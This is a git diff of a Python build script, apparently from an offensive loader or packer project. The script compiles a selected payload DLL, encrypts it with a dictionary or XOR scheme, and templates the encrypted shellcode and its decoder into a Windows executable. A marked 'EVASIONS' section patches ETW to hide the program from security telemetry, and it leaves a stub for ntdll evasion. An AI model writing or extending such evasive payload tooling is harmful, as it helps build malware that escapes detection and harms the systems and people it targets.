@@ -4,10 +4,12 @@ import argparse
 import os
 from core.encryptor import Encryptor
 from core.templator import Templator
-from core.configator import check_config
-from core.utils import dll2instructions, round_pow2
+from core.configator import check_config_and_merge
+from core.utils import round_pow2
+from core.orchestrator import prepare_build_env, build_dll, build_exe
 
 PAYLOAD_DIR = "src/dll/payloads"
+WORKING_FOLDER = "build/"
 
 config = ConfigParser()
 config.read(".conf")
@@ -44,6 +46,15 @@ def _discover_payloads(payload_dir: str):
             if f.endswith(".c"):
                 names.append(f[:-2])
     return names
+
+def get_selected_payload(args):
+    payload = None
+    for name in _discover_payloads(PAYLOAD_DIR):
+        if getattr(args, f"payload_{name}", False):
+            payload = name
+            break
+    assert payload is not None  # devrait être garanti par parse_args()
+    return payload
 
 def parse_args(argv=None):
     # We disable the automatic -h so we can add it inside our "Options" group.
@@ -103,9 +114,9 @@ def parse_args(argv=None):
 
 def main():
     args = parse_args()
-    print(args)
+    print(args) if args.verbose else None
 
-    check_config(config)
+    args = check_config_and_merge(config, args)
 
     # logger todo here
 
@@ -118,22 +129,26 @@ def main():
         - build exe                                                                               -> scripts/compile_exe.sh
     """
 
-
     # Ici on est en mode "build" avec exactement 1 payload sélectionné
     # Récupère le nom du payload choisi
-    payload = None
-    for name in _discover_payloads(PAYLOAD_DIR):
-        if getattr(args, f"payload_{name}", False):
-            payload = name
-            break
-    assert payload is not None  # devrait être garanti par parse_args()
+    payload = get_selected_payload(args)
 
     if args.verbose:
         print(f"[i] building with payload='{payload}', output='{args.output}', small={args.small}")
 
-    # Step 0: Prepare templator
+    # Step 0: Prepare build environment
+    prepare_build_env() # rm -rf build && mkdir -p build/bin bin && cp -r src include build/
+
 
     # Step 1: Replace templates in payload file
+    templator = Templator(working_folder="src/dll/payloads", templates_folder="src/templates/", verbose=args.verbose)
+    # replace all patterns execpt list of exceptions
+    templator.replace_all(exception=["%__PAYLOAD__%", "%__PAYLOAD_SIZE__%", "%__SHELLCODE__%", "%__SHELLCODE_DECODER__%"])
+
+
+    build_dll(payload, verbose=args.verbose)  # bash scripts/compile_dll.sh payload
+
+    exit(0)  # TODO remove me when done testing
 
     # Step 2: Encrypt payload
     if "dict" in config.get("Payload", "encryption_method"):
@@ -146,7 +161,6 @@ def main():
         dict_table = encryptor.get_association_table()              # get C association table
         dict_size = encryptor.get_nb_words()                      # get final size of the dictionary
 
-        exit(0)
     elif "xor" in config.get("Payload", "encryption_method"):
         # with open(f"{PAYLOAD_DIR}/{payload}.c", "r") as f:
         #     payload = f.read().encode()
@@ -158,11 +172,31 @@ def main():
         raise ValueError("Unknown encryption method")
 
     # Step 3: Replace payload in main app
-    templator = Templator(working_folder="build", verbose=args.verbose)
 
-    templator.sed_files("//__PAYLOAD_SIZE__//", str(round_pow2(dict_size)))
-    templator.sed_files("//__SHELLCODE_DECODER__//", "DICT_decrypt(dict_payload);")
-    templator.sed_files("//__SHELLCODE__//", f"unsigned char payload[];\n\n{dict_table}\n\nconst char* dict_payload = {encrypted_payload};")
+    if "dict" in config.get("Payload", "encryption_method"):
+        templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(dict_size)))
+        templator.sed_files("%__SHELLCODE_DECODER__%", "DICT_decrypt(dict_payload);")
+        templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[];\n\n{dict_table}\n\nconst char* dict_payload = {encrypted_payload};")
+    elif "xor" in config.get("Payload", "encryption_method"):
+        # templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(len(encrypted_payload)//2)))
+        # templator.sed_files("%__SHELLCODE_DECODER__%", f"XOR_decrypt(xor_payload, {config.getint('Payload', 'encryption_key', fallback=0x1337)});")
+        # templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
+        pass
+
+    if args.small:
+        templator.sed_files("int WinMain(", "int WinMainCRTStartup(")
+
+
+    # --------- EVASIONS ---------
+
+    if args.etw:
+        templator.sed_files("%__ETW_PATCHING__%", "patch_etw();")
+
+    if args.ntdll:
+        print("[i] ntdll evasion not implemented yet")
+
+    # Step 4: Build EXE
+    build_exe(args.output, prioritize_size=args.small, verbose=args.verbose)  # bash scripts/compile_exe.sh -o <output_file> --prioritize-size <true|false>
 
 
 if __name__ == "__main__":
